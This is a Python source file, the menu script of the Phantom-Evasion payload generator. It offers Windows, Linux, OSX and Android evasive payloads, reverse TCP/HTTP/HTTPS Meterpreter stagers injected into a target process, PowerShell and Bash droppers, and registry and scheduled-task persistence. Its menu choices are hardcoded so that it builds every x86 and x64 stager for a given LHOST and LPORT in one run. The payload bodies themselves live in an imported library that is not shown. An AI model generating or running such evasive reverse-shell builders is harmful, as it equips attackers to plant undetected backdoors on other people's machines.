#!/usr/bin/env python


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free softwar`e: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
import os,platform
import atexit
import random
import subprocess
from time import sleep
from shutil import rmtree
from random import shuffle
sys.path.insert(0,"Setup")
import Phantom_lib
sys.dont_write_bytecode = True
def InputFunc(Text):

    py_version=platform.python_version()

    if py_version[0] == "3":

        Ans = input(Text)

    else:

        Ans = raw_input(Text)

    return Ans
class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def complete_menu():
    answ=True
    while answ:
        Phantom_lib.clear()
        Phantom_lib.banner()
        Phantom_lib.menu_options()
        ans = "1"
        #ans = Phantom_lib.InputFunc("\n[>] Please insert option: ")

        if ans=="1":

            Phantom_lib.clear()
            print("---------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] WINDOWS MODULES INDEX:" + bcolors.ENDC)
            print("---------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1]  Shellcode Injection                                                 ")
            sleep(0.10)
            print("\n[2]  Stager                                                              ")
            sleep(0.10)
            print("\n[3]  Powershell / Wine-pyinstaller                                       ")
            sleep(0.10)
            print("\n[0]  Back                                                                ")
            sleep(0.10)

            ans = "2"
            #ans = Phantom_lib.InputFunc("\n[>] Please insert option: ")

            if ans == "2":

                Phantom_lib.clear()

                print("---------------------------------------------------------------------------")
                print(bcolors.OCRA + "[+] WINDOWS STAGER MODULES:" + bcolors.ENDC)
                print("---------------------------------------------------------------------------")
                sleep(0.10)
                print("\n[1]  X86 stagers                                                         ")
                sleep(0.10)
                print("\n[2]  X64 stagers                                                         ")
                sleep(0.10)
                print("\n[0]  Back                                                                ")
                sleep(0.10)

                Proc_target = ""
                LHOST=InputFunc("\n[>] Please insert LHOST: ")
                LPORT=InputFunc("\n[>] Please insert LPORT: ")
                Proc_target=InputFunc("\n[>] Please insert x86 target process (default:OneDrive.exe):")

                for i in range(1,3):
                    ans=str(i)
                    #ans = "1"
                    #ans = Phantom_lib.InputFunc("\n[>] Please insert option: ")

                    if ans == "1":

                        Phantom_lib.clear()
                        print("---------------------------------------------------------------------------")
                        print(bcolors.OCRA + "[+] WINDOWS x86 STAGER MODULES:" + bcolors.ENDC)
                        print("---------------------------------------------------------------------------")
                        arrayList = ["reverse_TCP VirtualAlloc","reverse_TCP_VirtualAlloc_NoDirectCall_GPAGMH","reverse_TCP_HeapAlloc","reverse_TCP_HeapAlloc_NoDirectCall_GPAGMH","reverse_HTTP_VirtualAlloc","reverse_HTTP_VirtualAlloc_NoDirectCall_GPAGMH","reverse_HTTP_HeapAlloc","reverse_HTTP_HeapAlloc_NoDirectCall_GPAGMH","reverse_HTTPS_VirtualAlloc","reverse_HTTPS_VirtualAlloc_NoDirectCall_GPAGMH","reverse_HTTPS_HeapAlloc","reverse_HTTPS_HeapAlloc_NoDirectCall_GPAGMH"]
                        for i in range(1,len(arrayList)+1):
                            print(i,arrayList[i-1])
                            ans = str(i)
                            #ans = Phantom_lib.InputFunc("\n[>] Please insert payload number: ")
                            ValidAns=False

                            if ans == "1":
                                module_type = "x86ReverseTcpMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans == "2":
                                module_type = "x86ReverseTcpMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "3":
                                module_type = "x86ReverseTcpMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans == "4":
                                module_type = "x86ReverseTcpMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "5":
                                module_type = "x86ReverseHttpMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans == "6":
                                module_type = "x86ReverseHttpMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "7":
                                module_type = "x86ReverseHttpMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans == "8":
                                module_type = "x86ReverseHttpMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "9":
                                module_type = "x86ReverseHttpsMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans == "10":
                                module_type = "x86ReverseHttpsMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "11":
                                module_type = "x86ReverseHttpsMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans == "12":
                                module_type = "x86ReverseHttpsMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans == "0":
                                print("\n")

                            else:
                                print("[-] Invalid option")
                                sleep(1.5)


                            if ValidAns==True:

                                OutFile = arrayList[i-1]
                                Phantom_lib.clear()
                                Phantom_lib.description_printer(module_type)
                                print("\n\n")
                                try:
                                    os.makedirs("outputExe")
                                except:
                                    junk=1

                                OutFolder = "outputExe/"+OutFile
                                print("Saving output to: " + OutFolder)
                                sleep(2.10)
                                Phantom_lib.Polymorphic_C_Meterpreter_launcher(module_type,LHOST,LPORT,Proc_target,OutFolder)





                    elif ans == "2":

                        arrayList = ["reverse_TCP VirtualAlloc","reverse_TCP_VirtualAlloc_NoDirectCall_GPAGMH","reverse_TCP_HeapAlloc","reverse_TCP_HeapAlloc_NoDirectCall_GPAGMH","reverse_HTTP_VirtualAlloc","reverse_HTTP_VirtualAlloc_NoDirectCall_GPAGMH","reverse_HTTP_HeapAlloc","reverse_HTTP_HeapAlloc_NoDirectCall_GPAGMH","reverse_HTTPS_VirtualAlloc","reverse_HTTPS_VirtualAlloc_NoDirectCall_GPAGMH","reverse_HTTPS_HeapAlloc","reverse_HTTPS_HeapAlloc_NoDirectCall_GPAGMH"]
                        for i in range(1,len(arrayList)+1):
                            print(i,"x64"+arrayList[i-1])
                            ans = str(i)
                            Phantom_lib.clear()
                            ValidAns=False

                            if ans=="1":
                                module_type = "x64ReverseTcpMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans=="2":
                                module_type = "x64ReverseTcpMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="3":
                                module_type = "x64ReverseTcpMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans=="4":
                                module_type = "x64ReverseTcpMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="5":
                                module_type = "x64ReverseHttpMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans=="6":
                                module_type = "x64ReverseHttpMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="7":
                                module_type = "x64ReverseHttpMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans=="8":
                                module_type = "x64ReverseHttpMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="9":
                                module_type = "x64ReverseHttpsMeterpreter_virtual_C_windows.py"
                                ValidAns=True

                            elif ans=="10":
                                module_type = "x64ReverseHttpsMeterpreter_virtualNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="11":
                                module_type = "x64ReverseHttpsMeterpreter_heap_C_windows.py"
                                ValidAns=True

                            elif ans=="12":
                                module_type = "x64ReverseHttpsMeterpreter_heapNDC_C_windows.py"
                                ValidAns=True

                            elif ans=="0":
                                print("\n")

                            else:
                                print("[-] Invalid option")
                                sleep(1.5)

                            if ValidAns==True:

                                OutFile = "x64"+arrayList[i-1]
                                Phantom_lib.clear()
                                Phantom_lib.description_printer(module_type)
                                print("\n\n")
                                try:
                                    os.makedirs("outputExe64")
                                except:
                                    junk=1

                                OutFolder = "outputExe64/"+OutFile
                                print("Saving output to: " + OutFolder)
                                sleep(2.10)
                                Phantom_lib.Polymorphic_C_Meterpreter_launcher(module_type,LHOST,LPORT,Proc_target,OutFolder)
                        sys.exit()





            elif ans == "3":

                Phantom_lib.clear()

                print("---------------------------------------------------------------------------")
                print(bcolors.OCRA + "[+] WINDOWS POWERSHELL MODULES:" + bcolors.ENDC)
                print("---------------------------------------------------------------------------")

                sleep(0.10)
                print("\n[1] Windows Powershell Oneliner Dropper                     (Powershell)")
                sleep(0.10)
                print("\n[2] Windows Powershell Script Dropper                       (Powershell)")
                sleep(0.10)
                print("\n[3] Windows WinePyinstaller Python Meterpreter                  (Python)")
                sleep(0.10)
                print("\n[4] Windows WinePyinstaller Oneline payload dropper             (Python)")
                sleep(0.10)
                print("\n[0] Back")
                sleep(0.10)

                ans = ""
                ans = Phantom_lib.InputFunc("\n[>] Please insert choice\'s number: ")


                if ans=="1":

                    module_type = "Polymorphic_PowershellOnelineDropper_windows.py"
                    Phantom_lib.clear()
                    Phantom_lib.description_printer(module_type)
                    print("\n\n")
                    Phantom_lib.powershell_completer(module_type)


                elif ans=="2":
                    module_type = "Polymorphic_PowershellScriptDropper_windows.py"
                    Phantom_lib.clear()
                    Phantom_lib.description_printer(module_type)
                    print("\n\n")
                    Phantom_lib.powershell_completer(module_type)


                elif ans =="3":

                    if Phantom_lib.wine_fastcheck() == True:

                        module_type = "Pytherpreter_Polymorphic"
                        Phantom_lib.clear()
                        Phantom_lib.description_printer(module_type)
                        Phantom_lib.pytherpreter_completer(module_type,"True")

                    else:

                        print(bcolors.RED + "\n[-] Wine Environment not ready\n" + bcolors.ENDC)
                        Phantom_lib.Enter2Continue()

                elif ans =="4":

                    if Phantom_lib.wine_fastcheck() == True:

                        module_type = "Pytherpreter_Polymorphic_Powershelloneline"
                        Phantom_lib.clear()
                        Phantom_lib.description_printer(module_type)
                        Phantom_lib.python_sys_completer("True")

                    else:

                        print(bcolors.RED + "\n[-] Wine Environment not ready\n" + bcolors.ENDC)
                        Phantom_lib.Enter2Continue()

                elif ans=="0":
                    print("\n")

            elif ans=="0":
                print("\n")

        elif ans=="2":

            Phantom_lib.clear()
            print("------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] LINUX MODULES:" + bcolors.ENDC)
            print("------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1] Linux Shellcode Injection HeapAlloc                            (C)")
            sleep(0.10)
            print("\n[2] Linux Bash Oneliner Dropper                                    (C)")
            sleep(0.10)
            print("\n[0] Back")
            sleep(0.10)

            ans = ""
            ans = Phantom_lib.InputFunc("\n[>] Please insert choice\'s number: ")

            if ans=="1":
                module_type = "ShellcodeInjection_heap_linux.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                print("\n\n")
                Phantom_lib.shellcode_completer(module_type)


            if ans=="2":
                module_type = "ShellcmdDropper_linux.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                print("\n\n")
                Phantom_lib.BashOnelinerDropper()


            elif ans=="0":
                print("\n")


        elif ans=="3":
            Phantom_lib.clear()
            print("------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] OSX MODULES:" + bcolors.ENDC)
            print("------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1] OSX 32 bit multi-encoding                              (Macho/Dmg)")
            sleep(0.10)
            print("\n[0] Back")
            sleep(0.10)

            ans = ""
            ans = Phantom_lib.InputFunc("\n[>] Please insert payload number: ")

            if ans =="1":
                module_type = "Osx_Cascade_Encoding"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.clear()
                Phantom_lib.osx_cascade_encoding()

            elif ans=="0":
                print("\n\n")

        elif ans=="4":
            Phantom_lib.clear()
            print("-------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] ANDROID MODULES:" + bcolors.ENDC)
            print("-------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1] Android Msfvenom Baksmali Obfuscator                          (Apk)")
            sleep(0.10)
            print("\n[0] Back")
            sleep(0.10)

            ans = ""
            ans = Phantom_lib.InputFunc("\n[>] Please insert option: ")

            if ans =="1":
                module_type = "Smali_Droidmare"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.clear()
                Phantom_lib.droidmare_launcher()

            elif ans=="0":
                print("\n\n")

        elif ans=="5":
            Phantom_lib.clear()
            print("-------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] UNIVERSAL MODULES:" + bcolors.ENDC)
            print("-------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1] Universal Meterpreter increments-trick                     (Python)")
            sleep(0.10)
            print("\n[2] Universal Polymorphic Meterpreter                          (Python)")
            sleep(0.10)
            print("\n[3] Universal Polymorphic Oneliner dropper                     (Python)")
            sleep(0.10)
            print("\n[0] Back")
            sleep(0.10)

            ans = ""
            ans = Phantom_lib.InputFunc("\n[>] Please insert payload number: ")

            if ans =="1":
                module_type = "Pytherpreter"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.pytherpreter_completer(module_type,False)

            elif ans =="2":
                module_type = "Pytherpreter_Polymorphic"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.pytherpreter_completer(module_type,False)

            elif ans =="3":
                module_type = "Pytherpreter_Polymorphic_Powershelloneline"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.python_sys_completer("False")

            elif ans=="0":
                print("\n\n")

        elif ans=="6":
            Phantom_lib.clear()
            print("-------------------------------------------------------------------------")
            print(bcolors.OCRA + "[+] POST-EXPLOITATION MODULES:" + bcolors.ENDC)
            print("-------------------------------------------------------------------------")
            sleep(0.10)
            print("\n[1] Windows Persistence RegCreateKeyExW Add Registry Key            (C)")
            sleep(0.10)
            print("\n[2] Windows Persistence REG Add Registry Key                      (CMD)")
            sleep(0.10)
            print("\n[3] Windows Persistence Keep Process Alive                          (C)")
            sleep(0.10)
            print("\n[4] Windows Persistence Schtasks cmdline                          (CMD)")
            sleep(0.10)
            print("\n[5] Windows Set Files Attribute Hidden                          (C/CMD)")
            sleep(0.10)
            print("\n[0] Back")
            sleep(0.10)

            ans = ""
            ans = Phantom_lib.InputFunc("\n[>] Please insert payload number: ")

            if ans == "1":
                module_type = "Windows_C_Persistence_Startup.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.Windows_C_PersistenceAgent(module_type)

            if ans == "2":
                module_type = "Windows_CMD_Persistence_REG"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.Windows_CMD_PersistenceAgent()


            elif ans == "3":
                module_type = "Windows_C_Persistence_TimeBased.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.Windows_C_PersistenceAgent(module_type)

            elif ans == "4":
                module_type = "Windows_CMD_Persistence_Schtasks.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.Windows_Schtasks_Persistence()

            elif ans == "5":
                module_type = "Windows_C_SetFilesAttributeHidden.py"
                Phantom_lib.clear()
                Phantom_lib.description_printer(module_type)
                Phantom_lib.SelectHideMode()




            elif ans=="0":
                print("\n\n")


        elif ans=="7":

            print("\n[>] Update check\n")
            sleep(0.2)
            if platform.system() == "Windows":

                subprocess.call(['git','status','-uno'],shell=True)

            else:

                subprocess.call(['git','status','-uno'])
            sleep(2)
            print("[>] Update check completed!\n")
            sleep(1)

        elif ans=="0":
            Phantom_lib.clear()
            print(bcolors.RED + "\n[<<PHANTOM--EXIT>>]\n\n" + bcolors.ENDC)
            sleep(0.2)
            Phantom_lib.exit_banner()
            sleep(0.2)
            quit()

        else:
            print("\n[-] Option Not Valid \n")
            sleep(1.5)


if __name__ == "__main__":

    Phantom_lib.python_banner()
    Phantom_lib.dependencies_checker()
    #Phantom_lib.advisor()
    try:
        complete_menu()

    except (KeyboardInterrupt, SystemExit):
        subprocess.call(['tmux','send-keys','-t','phantom-miner','\"\x03\"','C-m'], stdout=open(os.devnull,'wb'), stderr=open(os.devnull,'wb'))
